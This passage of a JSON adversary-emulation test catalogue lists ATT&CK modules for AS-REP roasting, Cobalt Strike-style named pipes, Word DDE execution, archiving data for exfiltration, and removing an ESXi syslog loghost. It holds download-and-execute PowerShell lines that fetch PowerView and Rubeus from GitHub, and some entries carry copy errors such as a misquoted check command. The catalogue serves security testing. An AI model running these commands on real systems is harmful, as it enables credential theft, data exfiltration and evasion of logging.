      "module_name": "Rubeus asreproast"
    },
    {
      "index": 1470,
      "technique_id": "T1558.004",
      "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting",
      "description": "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d6139549-7b72-4e48-9ea1-324fc9bdf88a",
      "module_name": "Get-DomainUser with PowerView"
    },
    {
      "index": 1471,
      "technique_id": "T1558.004",
      "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting",
      "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8c385f88-4d47-4c9a-814d-93d9deec8c71",
      "module_name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus"
    },
    {
      "index": 1472,
      "technique_id": "T1559",
      "technique_name": "Inter-Process Communication",
      "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 1\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Named pipe executors must exist on disk\n",
          "check_command": "if ((Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\n"
        }
      ],
      "rx_module_id": "bd13b9fc-b758-496a-b81a-397462f82c72",
      "module_name": "Cobalt Strike Artifact Kit pipe"
    },
    {
      "index": 1473,
      "technique_id": "T1559",
      "technique_name": "Inter-Process Communication",
      "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 2\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Named pipe executors must exist on disk\n",
          "check_command": "if ((Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\n"
        }
      ],
      "rx_module_id": "830c8b6c-7a70-4f40-b975-8bbe74558acd",
      "module_name": "Cobalt Strike Lateral Movement (psexec_psh) pipe"
    },
    {
      "index": 1474,
      "technique_id": "T1559",
      "technique_name": "Inter-Process Communication",
      "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 3\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Named pipe executors must exist on disk\n",
          "check_command": "if ((Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\n"
        }
      ],
      "rx_module_id": "d1f72fa0-5bc2-4b4b-bd1e-43b6e8cfb2e6",
      "module_name": "Cobalt Strike SSH (postex_ssh) pipe"
    },
    {
      "index": 1475,
      "technique_id": "T1559",
      "technique_name": "Inter-Process Communication",
      "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 4\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Named pipe executors must exist on disk\n",
          "check_command": "if ((Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\n"
        }
      ],
      "rx_module_id": "7a48f482-246f-4aeb-9837-21c271ebf244",
      "module_name": "Cobalt Strike post-exploitation pipe (4.2 and later)"
    },
    {
      "index": 1476,
      "technique_id": "T1559",
      "technique_name": "Inter-Process Communication",
      "description": "Uses the [Named Pipes Micro Emulation](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/micro_emulation_plans/src/named_pipes) executable from the Center for Threat Informed Defense to create a named pipe for inter-process communication.\n\nThe named pipe executable will pause for 30 seconds to allow the client and server to exchange a message through the pipe.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 5\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Named pipe executors must exist on disk\n",
          "check_command": "if ((Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\") -and (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_client.exe\") -and (\"Test-Path PathToRagloxModulesFolder\\..\\ExternalPayloads\\build\\namedpipes_server.exe\")) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing)\n$zipUrl  = \"https://github.com/center-for-threat-informed-defense/adversary_emulation_library/raw/master/micro_emulation_plans/src/named_pipes/named_pipes.zip\"\nInvoke-FetchFromZip $zipUrl \"*.exe\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\n"
        }
      ],
      "rx_module_id": "8dbfc15c-527b-4ab0-a272-019f469d367f",
      "module_name": "Cobalt Strike post-exploitation pipe (before 4.2)"
    },
    {
      "index": 1477,
      "technique_id": "T1559.002",
      "technique_name": "Inter-Process Communication: Dynamic Data Exchange",
      "description": "Executes commands via DDE using Microsfot Word\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f592ba2a-e9e8-4d62-a459-ef63abd819fd",
      "module_name": "Execute Commands"
    },
    {
      "index": 1478,
      "technique_id": "T1559.002",
      "technique_name": "Inter-Process Communication: Dynamic Data Exchange",
      "description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "start \"$PathToRagloxModulesFolder\\T1559.002\\bin\\DDE_Document.docx\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "47c21fb6-085e-4b0d-b4d2-26d72c3830b3",
      "module_name": "Execute PowerShell script via Word DDE"
    },
    {
      "index": 1479,
      "technique_id": "T1559.002",
      "technique_name": "Inter-Process Communication: Dynamic Data Exchange",
      "description": "\nTrustedSec - Unicorn - https://github.com/trustedsec/unicorn\n\nSensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nWord VBA Macro\n\n[Dragon's Tail](https://github.com/redcanaryco/raglox-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "cf91174c-4e74-414e-bec0-8d60a104d181",
      "module_name": "DDEAUTO"
    },
    {
      "index": 1480,
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -path #{output_file} -ErrorAction Ignore"
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Path that should be compressed into our output file",
          "type": "path",
          "default_value": "$env:USERPROFILE"
        },
        {
          "name": "output_file",
          "description": "Path where resulting compressed data should be placed",
          "type": "path",
          "default_value": "$env:USERPROFILE\\T1560-data-ps.zip"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "41410c60-614d-4b9d-b66e-b0192dd9c597",
      "module_name": "Compress Data for Exfiltration With PowerShell"
    },
    {
      "index": 1481,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{rar_exe}\" a -r #{output_file} #{input_path}\\*#{file_extension}\n",
        "elevation_required": false,
        "cleanup_command": "del /f /q /s #{output_file} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "input_path",
          "description": "Path that should be compressed into our output file",
          "type": "path",
          "default_value": "%USERPROFILE%"
        },
        {
          "name": "file_extension",
          "description": "Extension of files to compress",
          "type": "string",
          "default_value": ".txt"
        },
        {
          "name": "output_file",
          "description": "Path where resulting compressed data should be placed",
          "type": "path",
          "default_value": "%USERPROFILE%\\T1560.001-data.rar"
        },
        {
          "name": "rar_installer",
          "description": "Winrar installer",
          "type": "path",
          "default_value": "%TEMP%\\winrar.exe"
        },
        {
          "name": "rar_exe",
          "description": "The RAR executable from Winrar",
          "type": "path",
          "default_value": "%programfiles%/WinRAR/Rar.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Rar tool must be installed at specified location (#{rar_exe})\n",
          "check_command": "if not exist \"#{rar_exe}\" (exit /b 1)\n",
          "install_command": "echo Downloading Winrar installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" #{rar_installer}\n#{rar_installer} /S\n"
        }
      ],
      "rx_module_id": "02ea31cb-3b4c-4a2d-9bf1-e4e70ebcf5d0",
      "module_name": "Compress Data for Exfiltration With Rar"
    },
    {
      "index": 1482,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{rar_exe}\" a -hp\"blue\" hello.rar\ndir\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "rar_installer",
          "description": "Winrar installer",
          "type": "path",
          "default_value": "%TEMP%\\winrar.exe"
        },
        {
          "name": "rar_exe",
          "description": "The RAR executable from Winrar",
          "type": "path",
          "default_value": "%programfiles%/WinRAR/Rar.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Rar tool must be installed at specified location (#{rar_exe})\n",
          "check_command": "if not exist \"#{rar_exe}\" (exit /b 1)\n",
          "install_command": "echo Downloading Winrar installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" #{rar_installer}\n#{rar_installer} /S\n"
        }
      ],
      "rx_module_id": "8dd61a55-44c6-43cc-af0c-8bdda276860c",
      "module_name": "Compress Data and lock with password for Exfiltration with winrar"
    },
    {
      "index": 1483,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "Note: Requires winzip installation\nwzzip sample.zip -s\"blueblue\" *.txt (VARIANT)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "winzip_exe",
          "description": "Path to installed Winzip executable",
          "type": "path",
          "default_value": "%ProgramFiles%\\WinZip\\winzip64.exe"
        },
        {
          "name": "winzip_url",
          "description": "Path to download Windows Credential Editor zip file",
          "type": "url",
          "default_value": "https://download.winzip.com/gl/nkln/winzip24-home.exe"
        },
        {
          "name": "winzip_hash",
          "description": "File hash of the Windows Credential Editor zip file",
          "type": "string",
          "default_value": "B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB"
        }
      ],
      "prerequisites": [
        {
          "description": "Winzip must be installed\n",
          "check_command": "cmd /c 'if not exist \"#{winzip_exe}\" (echo 1) else (echo 0)'\n",
          "install_command": "IEX(IWR \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-WebRequestVerifyHash.ps1\" -UseBasicParsing)\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nif(Invoke-WebRequestVerifyHash \"#{winzip_url}\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\winzip.exe\" #{winzip_hash}){\n  Write-Host Follow the installation prompts to continue\n  cmd /c \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\winzip.exe\"\n}\n"
        }
      ],
      "rx_module_id": "01df0353-d531-408d-a0c5-3161bf822134",
      "module_name": "Compress Data and lock with password for Exfiltration with winzip"
    },
    {
      "index": 1484,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "Note: This test requires 7zip installation\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mkdir $PathToRagloxModulesFolder\\T1560.001\\victim-files\ncd $PathToRagloxModulesFolder\\T1560.001\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{7zip_exe}\" u archive.7z *txt -pblue\ndir\n",
        "elevation_required": false,
        "cleanup_command": "rmdir /s /Q $PathToRagloxModulesFolder\\T1560.001\\victim-files >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "7zip_installer",
          "description": "7zip installer",
          "type": "path",
          "default_value": "%TEMP%\\7zip.exe"
        },
        {
          "name": "7zip_exe",
          "description": "Path to installed 7zip executable",
          "type": "path",
          "default_value": "%ProgramFiles%\\7-zip\\7z.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "7zip tool must be installed at specified location (#{7zip_exe})\n",
          "check_command": "if not exist \"#{7zip_exe}\" (exit /b 1)\n",
          "install_command": "echo Downloading 7-zip installer\nbitsadmin /transfer myDownloadJob /download /priority normal \"https://www.7-zip.org/a/7z2301-x64.exe\" #{7zip_installer}\n#{7zip_installer} /S\n"
        }
      ],
      "rx_module_id": "d1334303-59cb-4a03-8313-b3e24d02c198",
      "module_name": "Compress Data and lock with password for Exfiltration with 7zip"
    },
    {
      "index": 1485,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "bash",
        "command": "zip #{output_file} #{input_files}\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{output_file}\n"
      },
      "variables": [
        {
          "name": "input_files",
          "description": "Path that should be compressed into our output file, may include wildcards",
          "type": "path",
          "default_value": "/var/log/{w,b}tmp"
        },
        {
          "name": "output_file",
          "description": "Path that should be output as a zip archive",
          "type": "path",
          "default_value": "$HOME/data.zip"
        }
      ],
      "prerequisites": [
        {
          "description": "Files to zip must exist (#{input_files})\n",
          "check_command": "if [ $(ls #{input_files} | wc -l) > 0 ] && [ -x $(which zip) ] ; then exit 0; else exit 1; fi;\n",
          "install_command": "(which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip)\necho Please set input_files argument to include files that exist\n"
        }
      ],
      "rx_module_id": "c51cec55-28dd-4ad2-9461-1eacbc82c3a0",
      "module_name": "Data Compressed - nix - zip"
    },
    {
      "index": 1486,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{input_file}.gz\n"
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Path that should be compressed",
          "type": "path",
          "default_value": "$HOME/victim-gzip.txt"
        },
        {
          "name": "input_content",
          "description": "contents of compressed files if file does not already exist. default contains test credit card and social security number",
          "type": "string",
          "default_value": "confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "cde3c2af-3485-49eb-9c1f-0ed60e9cc0af",
      "module_name": "Data Compressed - nix - gzip Single File"
    },
    {
      "index": 1487,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "tar -cvzf #{output_file} #{input_file_folder}\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{output_file}\n"
      },
      "variables": [
        {
          "name": "input_file_folder",
          "description": "Path that should be compressed",
          "type": "path",
          "default_value": "$HOME/$USERNAME"
        },
        {
          "name": "output_file",
          "description": "File that should be output",
          "type": "path",
          "default_value": "$HOME/data.tar.gz"
        }
      ],
      "prerequisites": [
        {
          "description": "Folder to zip must exist (#{input_file_folder})\n",
          "check_command": "test -e #{input_file_folder}\n",
          "install_command": "mkdir -p #{input_file_folder} && touch #{input_file_folder}/file1\n"
        }
      ],
      "rx_module_id": "7af2b51e-ad1c-498c-aca8-d3290c19535a",
      "module_name": "Data Compressed - nix - tar Folder or File"
    },
    {
      "index": 1488,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "Encrypt data for exiltration\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"#{encryption_password}\" #{test_folder}/#{test_file} ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\nls -l #{test_folder}\n",
        "elevation_required": false,
        "cleanup_command": "rm -Rf #{test_folder}\n"
      },
      "variables": [
        {
          "name": "test_folder",
          "description": "Path used to store files.",
          "type": "path",
          "default_value": "/tmp/T1560"
        },
        {
          "name": "test_file",
          "description": "Temp file used to store encrypted data.",
          "type": "path",
          "default_value": "T1560"
        },
        {
          "name": "encryption_password",
          "description": "Password used to encrypt data.",
          "type": "string",
          "default_value": "InsertPasswordHere"
        }
      ],
      "prerequisites": [
        {
          "description": "gpg and zip are required to run the test.",
          "check_command": "if [ ! -x \"$(command -v gpg)\" ] || [ ! -x \"$(command -v zip)\" ]; then exit 1; fi;\n",
          "install_command": "(which pkg && pkg install -y gnupg zip)||(which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg)\n"
        }
      ],
      "rx_module_id": "0286eb44-e7ce-41a0-b109-3da516e05a5f",
      "module_name": "Data Encrypted with zip and gpg symmetric"
    },
    {
      "index": 1489,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "An adversary may compress all the collected data, encrypt and send them to a C2 server using base64 encoding. \nThis RAGLOX module tries to emulate the behaviour of the FLEXIROOT backdoor to archive the collected data. FLEXIROOT typically utilizes AES encryption and base64 encoding to transfer the encrypted data to the C2 server. \nIn this test, standard zip compression and the OpenSSL library are used to encrypt the compressed data.\nhttps://attack.mitre.org/versions/v7/software/S0267/",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "bash",
        "command": "zip -r  #{input_folder}/#{input_file}.zip #{input_folder}\nopenssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc \ncat #{input_folder}/#{input_file}.enc | base64",
        "elevation_required": false,
        "cleanup_command": "rm -rf #{input_folder}"
      },
      "variables": [
        {
          "name": "input_folder",
          "description": "Path to the folder used to store the test files",
          "type": "path",
          "default_value": "/tmp/t1560"
        },
        {
          "name": "input_file",
          "description": "Name of the compressed and encrypted files",
          "type": "string",
          "default_value": "t1560_data"
        },
        {
          "name": "enc_pass",
          "description": "Password used to encrypt the data",
          "type": "string",
          "default_value": "raglox_enc_pass"
        }
      ],
      "prerequisites": [
        {
          "description": "The folder and test files must exist",
          "check_command": "if [ ! -d #{input_folder} ]; then exit 1; else exit 0; fi;",
          "install_command": "if [ ! -d #{input_folder} ]; then mkdir -p #{input_folder}; cd #{input_folder}; touch {a..z}.data; fi;"
        }
      ],
      "rx_module_id": "a743e3a6-e8b2-4a30-abe7-ca85d201b5d3",
      "module_name": "Encrypts collected data with AES-256 and Base64"
    },
    {
      "index": 1490,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "An adversary may edit the syslog config to remove the loghost in order to prevent or redirect logs being received by SIEM.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Extract line with IP address from the syslog configuration output\n#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToRagloxModulesFolder\\..\\rx_modules\\T1560.001\\src\\esxi_get_loghost.txt | findstr /r \"[0-9]*\\.[0-9]*\\.[0-9]*\\.\" > c:\\temp\\loghost.txt\n\n# Replace the IP with \"0\"\n#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToRagloxModulesFolder\\..\\rx_modules\\T1560.001\\src\\esxi_remove_loghost.txt\n\n# Extract the IP from the line extracted from findstr\n$inputFilePath = \"c:\\temp\\loghost.txt\"\n$outputFilePath = \"c:\\temp\\loghost_ip.txt\"\n\n$fileContent = Get-Content -Path $inputFilePath -Raw\n\nif ([string]::IsNullOrWhiteSpace($fileContent)) {\n    Write-Host \"The content is $fileContent\"\n    Write-Host \"The file is empty\"\n} else {\n    # Use a regular expression to extract IP addresses\n    $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\\/\\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value\n    \n    $output = \"esxcli system syslog config set --loghost=\" + $ipAddresses\n\n    $output | Out-File -FilePath $outputFilePath -Encoding ascii\n    \n    Write-Host \"IP addresses extracted and saved to $outputFilePath\"\n}\n",
        "elevation_required": true,
        "cleanup_command": "# Re-add the initially extracted IP\n#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m c:\\temp\\loghost_ip.txt\n\nrm c:\\temp\\loghost_ip.txt\nrm c:\\temp\\loghost.txt\n"
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "plink_file",
          "description": "Path to Putty",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        },
        {
          "name": "username",
          "description": "Username used to log into ESXi",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "password",
          "description": "password used to log into ESXI",
          "type": "string",
          "default_value": "n/a"
        }
      ],
      "prerequisites": [
        {
          "description": "The plink executable must be found in the ExternalPayloads folder.\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
